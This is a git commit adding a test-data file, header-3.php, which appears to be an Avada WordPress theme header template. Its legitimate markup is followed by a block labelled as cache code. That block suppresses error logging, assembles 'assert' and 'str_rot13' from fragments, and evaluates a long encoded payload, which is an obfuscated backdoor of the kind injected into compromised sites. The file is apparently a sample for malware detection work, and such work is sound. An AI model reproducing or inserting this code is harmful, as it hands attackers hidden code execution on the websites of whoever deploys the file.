3edcfa40783c0c5b45104c3fa0114f9b21ad254c
jay <jay@web1.dawning.ca>
2016-11-13 12:44:40 -0700

    Getting ready to push to github

---
+++ testData/header-3.php
@@ -0,0 +1,76 @@
+<div class="fusion-header-sticky-height"></div>
+<div class="fusion-header">
+	<div class="fusion-row">
+		<div class="fusion-header-v6-content">
+			<?php 
+			avada_logo();
+			$menu = avada_main_menu( true );
+			?>
+			
+			<div class="fusion-flyout-menu-icons">
+				<?php if ( class_exists('WooCommerce') && Avada()->settings->get( 'woocommerce_cart_link_main_nav' ) ) :
+					global $woocommerce;
+				
+					if ( Avada()->settings->get( 'woocommerce_cart_counter') && $woocommerce->cart->get_cart_contents_count() ) {
+						$cart_link_text = '<span class="fusion-widget-cart-number">' . $woocommerce->cart->get_cart_contents_count() . '</span>';
+						$cart_link_class = ' fusion-widget-cart-counter';
+					} else {
+						$cart_link_text = '';
+						$cart_link_class  = '';
+					}
+				?>
+					<div class="fusion-flyout-cart-wrapper">
+						<a href="<?php echo get_permalink( get_option( 'woocommerce_cart_page_id' ) ); ?>" class="fusion-icon fusion-icon-shopping-cart<?php echo $cart_link_class; ?>"><?php echo $cart_link_text; ?></a>
+					</div>
+				<?php endif; ?>
+
+				<?php if (  Avada()->settings->get( 'main_nav_search_icon' ) ) : ?>
+					<div class="fusion-flyout-search-toggle">
+						<div class="fusion-toggle-icon">
+							<div class="fusion-toggle-icon-line"></div>
+							<div class="fusion-toggle-icon-line"></div>
+							<div class="fusion-toggle-icon-line"></div>
+						</div>
+						<a class="fusion-icon fusion-icon-search"></a>
+					</div>
+				<?php endif; ?>
+
+				<div class="fusion-flyout-menu-toggle">
+					<div class="fusion-toggle-icon-line"></div>
+					<div class="fusion-toggle-icon-line"></div>
+					<div class="fusion-toggle-icon-line"></div>
+				</div>
+			</div>
+		</div>
+
+		<div class="fusion-main-menu fusion-flyout-menu">
+			<?php echo $menu; ?>
+		</div>
+
+		<?php if (  Avada()->settings->get( 'main_nav_search_icon' ) ) : ?>
+			<div class="fusion-flyout-search">
+				<?php get_search_form(); ?>
+			</div>
+		<?php endif; ?>
+
+		<div class="fusion-flyout-menu-bg"></div>		
+	</div>
+</div>
+
+
+<?php 
+//###=CACHE START=###
+@error_reporting(E_ALL);
+@ini_set("error_log",NULL);
+@ini_set("log_errors",0);
+@ini_set("display_errors", 0);
+@error_reporting(0);
+$wa = ASSERT_WARNING;
+@assert_options(ASSERT_ACTIVE, 1);
+@assert_options($wa, 0);
+@assert_options(ASSERT_QUIET_EVAL, 1);
+
+$strings = "as"; $strings .= "se";  $strings .= "rt"; $strings2 = "st"; $strings2 .= "r_r";  $strings2 .= "ot13"; $gbz = "riny(".$strings2("base64_decode");
+$light =  $strings2($gbz.'("nJLtXPScp3AyqPtxnJW2XFxtrlNtMKWlo3WspzIjo3W0nJ5aXQNcBjccMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFxtrlOyL2uiVPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKGftsFOyoUAyVUfXWUIloPN9VPWbqUEjBv8ioT9uMUIjMTS0MKZhL29gY2qyqP5jnUN/nKN9Vv51pzkyozAiMTHbWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0cYvVzMQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMcCGRznQ0vYz1xAFtvZwSxLGVkAwqzBJEvBTSwAwV4ZwLkMGp3AQyvLJH1ZwDkZFVcBjccMvuzqJ5wqTyioy9yrTymqUZbVzA1pzksnJ5cqPVcXFO7PvEwnPN9VTA1pzksnJ5cqPtxqKWfXGfXL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK0uSDHESHvjtExSZH0HcB2A1pzksp2I0o3O0XPEwqKWfYPOQIIWZG1OHK0ACGx5SD1EHFH1SG1IHYPN1XGftL3IloS9mMKEipUDbWTA1pzjfVRAIHxkCHSEsIRyAEH9IIPjtAFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvEcLaLtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjc9VTIfp2IcMvucozysM2I0XPWuoTkiq191pzksMz9jMJ4vXFN9CFNkXFO7PvEcLaLtCFOznJkyK2qyqS9wo250MJ50pltxqKWfXGfXsDccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtoJD1XT1xAFtxK1WSHIISH1EoVaNvKFxcVQ09VPVkAwN0MwH5ZmxjZwp3ZGVlBGp1BJDjMQHkAGyzA2HkLvVcVUftMKMuoPumqUWcpUAfLKAbMKZbWS9FEISIEIAHJlWwVy0cXGftsDcyL2uiVPEcLaL7PtxWPK0tsD=="));'); $strings($light);
+//###=CACHE END=###
+?>
